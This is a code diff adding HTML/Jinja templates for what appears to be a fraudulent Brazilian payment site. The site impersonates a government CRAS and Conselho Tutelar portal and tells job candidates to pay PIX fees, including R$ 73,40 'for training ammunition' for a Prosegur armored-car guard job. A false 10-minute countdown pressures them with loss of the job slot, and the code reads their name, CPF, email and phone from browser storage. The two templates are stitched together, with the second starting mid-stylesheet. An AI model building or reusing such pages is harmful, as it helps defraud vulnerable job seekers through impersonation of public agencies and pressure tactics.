@@ -1,0 +1,503 @@
+{% extends "layout.html" %}
+
+{% block content %}
+<div class="max-w-2xl mx-auto px-4 py-6">
+    <!-- Institutional Header -->
+    <div class="text-center mb-4">
+        <div class="bg-slate-800 text-white rounded-lg p-4 mb-4 shadow-lg border border-slate-600 relative overflow-hidden">
+            <!-- Elegant accent -->
+            <div class="absolute top-0 left-1/2 transform -translate-x-1/2 w-20 h-0.5 bg-amber-400"></div>
+            
+            <div class="relative z-10">
+                <div class="inline-flex items-center justify-center w-12 h-12 bg-amber-400 rounded-full mb-3 shadow-md">
+                    <i class="fas fa-university text-lg text-slate-800"></i>
+                </div>
+                <h1 class="text-xl font-light tracking-wider mb-2 text-slate-100">
+                    TAXA PROCESSUAL
+                </h1>
+                <div class="w-16 h-px bg-amber-400 mx-auto mb-2"></div>
+                <p class="text-base font-medium text-slate-200 mb-1">Contribuição Institucional</p>
+                <p class="text-xs text-slate-300 font-light">PIX Instantâneo • R$ 29,90</p>
+                <div class="mt-3 px-3 py-1 bg-slate-700 rounded-full inline-block">
+                    <p class="text-xs text-amber-400 font-medium">PROCESSO OFICIAL</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Fee Information -->
+    <div class="bg-white rounded-lg shadow-md border border-slate-200 p-4 mb-4">
+        <div class="text-center mb-3">
+            <div class="inline-flex items-center justify-center w-10 h-10 bg-amber-100 rounded-full mb-2">
+                <i class="fas fa-file-invoice-dollar text-base text-amber-600"></i>
+            </div>
+            <h2 class="text-lg font-light text-slate-800 mb-1">Contribuição Processual</h2>
+            <div class="w-12 h-px bg-amber-400 mx-auto"></div>
+        </div>
+        
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div class="bg-slate-50 rounded p-3 border border-slate-100">
+                <div class="text-center mb-2">
+                    <span class="text-2xl font-light text-slate-800">R$ 29,90</span>
+                    <p class="text-slate-600 font-light text-xs mt-1">Taxa única</p>
+                </div>
+                <p class="text-slate-700 leading-relaxed text-center font-light text-xs">
+                    Contribuição para <span class="font-medium text-slate-800">processamento da candidatura</span> 
+                    e <span class="font-medium text-amber-600">análise técnica especializada</span>.
+                </p>
+            </div>
+            
+            <div class="bg-amber-50 rounded p-3 border border-amber-200">
+                <h3 class="font-medium text-slate-800 mb-2 text-center text-xs">Serviços Inclusos:</h3>
+                <div class="space-y-1">
+                    <div class="flex items-center">
+                        <div class="w-1 h-1 bg-amber-400 rounded-full mr-1.5"></div>
+                        <span class="text-slate-700 font-light text-xs">Material técnico especializado</span>
+                    </div>
+                    <div class="flex items-center">
+                        <div class="w-1 h-1 bg-amber-400 rounded-full mr-1.5"></div>
+                        <span class="text-slate-700 font-light text-xs">Certificação de participação</span>
+                    </div>
+                    <div class="flex items-center">
+                        <div class="w-1 h-1 bg-amber-400 rounded-full mr-1.5"></div>
+                        <span class="text-slate-700 font-light text-xs">Suporte técnico integral</span>
+                    </div>
+                    <div class="flex items-center">
+                        <div class="w-1 h-1 bg-amber-400 rounded-full mr-1.5"></div>
+                        <span class="text-slate-700 font-light text-xs">Análise curricular especializada</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PIX payment section -->
+    <div class="bg-white rounded-lg shadow-lg border p-6 mb-6">
+        <h3 class="font-semibold text-lg text-gray-800 mb-6 text-center">PIX - Copia e Cola</h3>
+        
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 items-center">
+            <!-- QR Code -->
+            <div class="text-center">
+                <div class="bg-gray-100 rounded-lg p-8 mb-4 inline-block">
+                    <div class="w-40 h-40 bg-white border-2 border-gray-300 rounded-lg flex items-center justify-center">
+                        <i class="fas fa-qrcode text-6xl text-gray-400"></i>
+                    </div>
+                </div>
+                <p class="text-sm text-gray-600">Escaneie com seu app do banco</p>
+            </div>
+
+            <!-- PIX Code -->
+            <div>
+                <div class="bg-gray-50 rounded-lg p-4 mb-4">
+                    <p class="text-base text-gray-800 mb-3 font-medium">Código PIX:</p>
+                    <div class="bg-white rounded-lg p-3 border break-all">
+                        <code class="text-sm text-gray-800">00020126580014BR.GOV.BCB.PIX0136{{ transaction_id or 'aguardando...' }}</code>
+                    </div>
+                    <button onclick="copyPix()" class="mt-4 w-full bg-[#1451B4] text-white px-6 py-3 rounded-lg text-base hover:bg-[#0c326f] transition-colors font-medium">
+                        <i class="fas fa-copy mr-2"></i>Copiar Código PIX
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment status -->
+    <div class="bg-white rounded-lg shadow-lg border p-6 mb-6">
+        <div class="flex items-center justify-center space-x-3 text-orange-600 mb-4">
+            <i class="fas fa-clock text-xl"></i>
+            <span class="text-lg font-medium">Aguardando Pagamento</span>
+        </div>
+        <p class="text-base text-gray-600 text-center">
+            Após o pagamento, você será redirecionado automaticamente
+        </p>
+    </div>
+
+    <!-- Help section -->
+    <div class="bg-gray-50 rounded-lg p-6">
+        <h4 class="font-semibold text-lg text-gray-800 mb-4 flex items-center">
+            <i class="fas fa-question-circle text-[#1451B4] mr-3"></i>Como Pagar?
+        </h4>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <div class="text-center">
+                <div class="bg-[#1451B4] text-white rounded-full w-12 h-12 flex items-center justify-center text-lg font-bold mx-auto mb-3">1</div>
+                <h5 class="font-medium text-base mb-2">Abra seu app bancário</h5>
+                <p class="text-sm text-gray-600">Acesse o aplicativo do seu banco</p>
+            </div>
+            <div class="text-center">
+                <div class="bg-[#1451B4] text-white rounded-full w-12 h-12 flex items-center justify-center text-lg font-bold mx-auto mb-3">2</div>
+                <h5 class="font-medium text-base mb-2">Escolha PIX</h5>
+                <p class="text-sm text-gray-600">Selecione "PIX" > "Copia e Cola"</p>
+            </div>
+            <div class="text-center">
+                <div class="bg-[#1451B4] text-white rounded-full w-12 h-12 flex items-center justify-center text-lg font-bold mx-auto mb-3">3</div>
+                <h5 class="font-medium text-base mb-2">Cole o código</h5>
+                <p class="text-sm text-gray-600">Cole o código PIX copiado</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+function copyPix() {
+    const pixCode = document.querySelector('code').textContent;
+    navigator.clipboard.writeText(pixCode).then(() => {
+        alert('Código PIX copiado!');
+    });
+}
+
+// Check payment status
+setInterval(() => {
+    // Payment status check would go here
+    console.log('Checking payment status...');
+}, 5000);
+</script>
+{% endblock %}
+          line-height: 1.5;
+        }
+    </style>
+    
+    <!-- Mobile Protection - Execute immediately -->
+    <script src="{{ url_for('static', filename='mobile-protection.js') }}"></script>
+</head>
+<body>
+    <!-- Government Header -->
+    <header class="bg-[#222222] text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo Governo" class="h-6" />
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- CRAS Header -->
+    <div class="bg-[#044785] py-3">
+        <div class="container mx-auto px-4 text-center">
+            <img src="https://i.postimg.cc/zvmGLmsw-/Localiza-Fone-4-1-1.png" alt="Logo CRAS" class="h-8 mx-auto" />
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <section class="py-10 md:py-14">
+        <div class="container mx-auto px-4 md:px-8 text-center">
+            <h2 class="text-lg md:text-xl font-bold mb-1 leading-tight">Confirmação de Agendamento do Curso</h2>
+            <div class="w-24 h-2 bg-[#044785] mx-auto mb-3 rounded-full"></div>
+            <!-- Countdown Timer -->
+            <div class="bg-red-50 border border-red-200 rounded-lg p-4 mb-6 max-w-md mx-auto">
+                <div class="text-center">
+                    <h3 class="text-lg font-bold text-red-800 mb-2">⏰ TEMPO LIMITE PARA PAGAMENTO</h3>
+                    <p class="text-red-700 text-sm mb-3">Você tem <strong>10 minutos</strong> para efetuar o pagamento ou perderá sua vaga!</p>
+                    <div id="countdown-timer" class="text-2xl font-bold text-red-600 bg-white p-3 rounded-lg">
+                        10:00
+                    </div>
+                </div>
+            </div>
+            
+            <p class="max-w-3xl mx-auto mb-6 md:mb-10 leading-relaxed text-sm">
+                Para confirmar o agendamento do curso prático para assumir a vaga de Vigilante de Carro Forte, é obrigatório o pagamento da munição que será utilizada no treinamento. O valor é de <span class="font-bold text-red-600">R$ 73,40</span>.
+            </p>
+
+            <div class="flex flex-col items-center mb-6">
+                {% if payment_data %}
+                <!-- Payment Status Box -->
+                <div class="bg-gray-100 border border-gray-300 rounded-lg p-4 mb-6 w-full max-w-2xl mx-auto">
+                    <div class="flex items-center justify-center space-x-2 mb-4">
+                        <div class="w-6 h-6 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+                        <span class="text-blue-600 font-medium text-sm">Aguardando pagamento para finalizar</span>
+                    </div>
+                    <div class="border-t border-gray-300 pt-4 text-left">
+                        <p class="text-sm text-gray-700 mb-3" id="training-info">
+                            Após o pagamento, você deve comparecer ao local de treinamento conforme agendado.
+                        </p>
+                        <h4 class="font-semibold text-gray-800 mb-2 text-sm">Documentos obrigatórios para levar no dia:</h4>
+                        <ul class="list-disc list-inside space-y-1 text-sm text-gray-700">
+                            <li>Documento de identificação com foto (RG ou CNH)</li>
+                            <li>Comprovante de residência</li>
+                            <li>Carteira de trabalho</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <img src="{{ payment_data.pixQrCode }}" alt="QR Code para pagamento do curso prático de Vigilante de Carro Forte" class="w-48 h-48 mb-4">
+                <p class="text-sm text-gray-600 mb-4">Escaneie o QR Code acima para realizar o pagamento.</p>
+                {% else %}
+                <!-- Error Status Box -->
+                <div class="bg-gray-100 border border-gray-300 rounded-lg p-4 mb-6 w-full max-w-2xl mx-auto">
+                    <div class="flex items-center justify-center space-x-2 mb-4">
+                        <div class="w-6 h-6 border-4 border-red-500 border-t-transparent rounded-full animate-spin"></div>
+                        <span class="text-red-500 font-medium text-sm">Erro ao gerar pagamento</span>
+                    </div>
+                    <div class="border-t border-gray-300 pt-4 text-left">
+                        <p class="text-sm text-gray-700 mb-3" id="training-info-error">
+                            Após o pagamento, você deve comparecer ao local de treinamento conforme agendado.
+                        </p>
+                        <h4 class="font-semibold text-gray-800 mb-2 text-sm">Documentos obrigatórios para levar no dia:</h4>
+                        <ul class="list-disc list-inside space-y-1 text-sm text-gray-700">
+                            <li>Documento de identificação com foto (RG ou CNH)</li>
+                            <li>Comprovante de residência</li>
+                            <li>Carteira de trabalho</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4">
+                    <p>Não foi possível gerar o pagamento PIX. Tente novamente.</p>
+                    <a href="/agendamento" class="text-red-800 underline">Voltar ao agendamento</a>
+                </div>
+                {% endif %}
+            </div>
+
+
+
+            {% if payment_data %}
+            <div class="max-w-lg mx-auto">
+                <label for="pix-code" class="block text-sm font-medium text-gray-700 mb-2">Código Pix (Copia e Cola):</label>
+                <div class="relative mb-4">
+                    <input type="text" id="pix-code" value="{{ payment_data.pixCode }}" readonly class="w-full px-4 py-2 border border-gray-300 rounded-lg text-sm text-gray-700">
+                </div>
+                <button onclick="copyPixCode()" class="bg-[#044785] text-white font-medium px-4 py-2 rounded text-sm w-full">Copiar Código Pix</button>
+            </div>
+            {% endif %}
+
+            <p class="max-w-3xl mx-auto mt-6 mb-6 md:mb-10 leading-relaxed text-sm font-bold text-red-600">
+                Atenção: Caso o pagamento não seja realizado, você poderá perder a vaga para outro candidato que efetuar o pagamento antes de você. Garanta sua vaga agora mesmo!
+            </p>
+
+            <p class="max-w-3xl mx-auto mb-6 md:mb-10 leading-relaxed text-sm">
+                Após o pagamento, o curso de Vigilante da Prosegur será confirmado e você poderá assumir a vaga. Certifique-se de clicar no botão abaixo após realizar o pagamento.
+            </p>
+
+            <a href="#" class="bg-[#044785] text-white font-medium px-6 md:px-8 py-3 rounded-full inline-block">Confirmar Pagamento</a>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-[#044785] text-white py-8 md:py-12">
+        <div class="container mx-auto px-4 md:px-8">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Sobre o Conselho Tutelar</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">O que é o Conselho Tutelar</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Missão e Valores</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Onde Atuamos</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Serviços</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Proteção à Criança</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Defesa de Direitos</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Medidas de Proteção</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Orientação Familiar</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">ECA - Lei 8.069/90</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Direitos da Criança</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Direitos do Adolescente</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Medidas Protetivas</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Atos Infracionais</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Políticas de Atendimento</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Processo Seletivo</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Vagas Conselheiro</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Requisitos</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Capacitações</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Concursos</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <hr class="border-blue-400 mb-6">
+            
+            <div class="flex flex-col md:flex-row justify-between items-center text-xs text-white">
+                <div class="mb-4 md:mb-0">
+                    <span>© Copyright 2025 CRAS - Centro de Referência de Assistência Social</span>
+                </div>
+                <div class="flex flex-wrap justify-center gap-2 md:gap-4">
+                    <a href="#" class="hover:text-gray-200">Mapa do Site</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Política de Privacidade</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Lei de Acesso à Informação</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Acessibilidade</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Ouvidoria</a>
+                </div>
+                <div class="flex space-x-4 mt-4 md:mt-0">
+                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-facebook-square"></i></a>
+                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-instagram"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // 10-minute countdown timer
+        let timeLeft = 10 * 60; // 10 minutes in seconds
+        const timerElement = document.getElementById('countdown-timer');
+        
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            
+            timerElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+            
+            // Change color when time is running out
+            if (timeLeft <= 120) { // Last 2 minutes
+                timerElement.classList.add('text-red-800', 'animate-pulse');
+            } else if (timeLeft <= 300) { // Last 5 minutes
+                timerElement.classList.add('text-red-700');
+            }
+            
+            if (timeLeft <= 0) {
+                // Time's up - redirect to timeout page
+                timerElement.textContent = "TEMPO ESGOTADO!";
+                timerElement.classList.add('text-red-900', 'bg-red-100');
+                setTimeout(() => {
+                    alert("Tempo esgotado! Você perdeu sua vaga. Será redirecionado para nova tentativa.");
+                    window.location.href = "/agendamento";
+                }, 2000);
+                return;
+            }
+            
+            timeLeft--;
+        }
+        
+        // Hide loading overlay after 3 seconds
+        setTimeout(function() {
+            document.getElementById('payment-loading').style.display = 'none';
+        }, 3000);
+        
+        // Retrieve user data from localStorage if available
+        const userData = {
+            name: localStorage.getItem('candidateName') || 'Candidato',
+            cpf: localStorage.getItem('candidateCPF') || '',
+            email: localStorage.getItem('candidateEmail') || '',
+            phone: localStorage.getItem('candidatePhone') || '',
+            city: localStorage.getItem('candidateCity') || ''
+        };
+        console.log('User data from localStorage:', userData);
+        
+        // Update timer every second
+        updateTimer();
+        setInterval(updateTimer, 1000);
+        
+        function copyPixCode() {
+            const pixCode = document.getElementById('pix-code');
+            pixCode.select();
+            pixCode.setSelectionRange(0, 99999); // For mobile devices
+            navigator.clipboard.writeText(pixCode.value);
+            
+            // Change button text temporarily
+            const button = event.target;
+            const originalText = button.textContent;
+            button.textContent = 'Copiado!';
+            button.style.backgroundColor = '#10B981';
+            button.style.color = 'white';
+            
+            setTimeout(() => {
+                button.textContent = originalText;
+                button.style.backgroundColor = '#044785';
+                button.style.color = 'black';
+            }, 2000);
+        }
+
+        // Automatic payment status checking for R$ 73.40 payments
+        let statusCheckInterval;
+        
+        function startPaymentStatusCheck() {
+            // Get transaction ID from template variable first, then fallback to other sources
+            let transactionId = '{{ transaction_id }}' || null;
+            
+            // If not available from template, try other sources
+            if (!transactionId || transactionId === 'None') {
+                const urlParams = new URLSearchParams(window.location.search);
+                transactionId = urlParams.get('transaction_id') || 
+                              sessionStorage.getItem('transactionId') || 
+                              localStorage.getItem('transactionId') ||
+                              localStorage.getItem('paymentId');
+                
+                // Also check if there's a payment data object in localStorage
+                if (!transactionId) {
+                    try {
+                        const paymentData = JSON.parse(localStorage.getItem('payment_data') || '{}');
+                        transactionId = paymentData.id || paymentData.transactionId;
+                    } catch (e) {
+                        console.log('Error parsing payment data from localStorage');
+                    }
+                }
+            }
+            
+            if (!transactionId || transactionId === 'None') {
+                console.log('No transaction ID found for status checking');
+                return;
+            }
+            
+            console.log('Starting automatic payment status check for transaction:', transactionId);
+            
+            // Check payment status every 1 second for immediate redirection
+            statusCheckInterval = setInterval(() => {
+                checkPaymentStatus(transactionId);
+            }, 1000);
+            
+            // Initial check
+            checkPaymentStatus(transactionId);
+        }
+        
+        function checkPaymentStatus(transactionId) {
+            fetch(`/check_payment_status/${transactionId}`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Payment status check result:', data);
+                    
+                    if (data.success && data.redirect) {
+                        // Stop checking
+                        clearInterval(statusCheckInterval);
+                        
+                        // Show confirmation message
+                        alert('Pagamento confirmado! Redirecionando para ativação da CNV...');
+                        
+                        // Use redirect_url if provided, otherwise default to /aviso
+                        const redirectUrl = data.redirect_url || '/aviso';
+                        console.log('Payment confirmed - redirecting to:', redirectUrl);
+                        
+                        // Redirect immediately
+                        window.location.href = redirectUrl;
+                    }
+                })
+                .catch(error => {
+                    console.error('Error checking payment status:', error);
+                });
+        }
+        
+        // Start automatic payment checking when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            // Start checking immediately for fastest redirection
+            setTimeout(() => {
+                startPaymentStatusCheck();
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
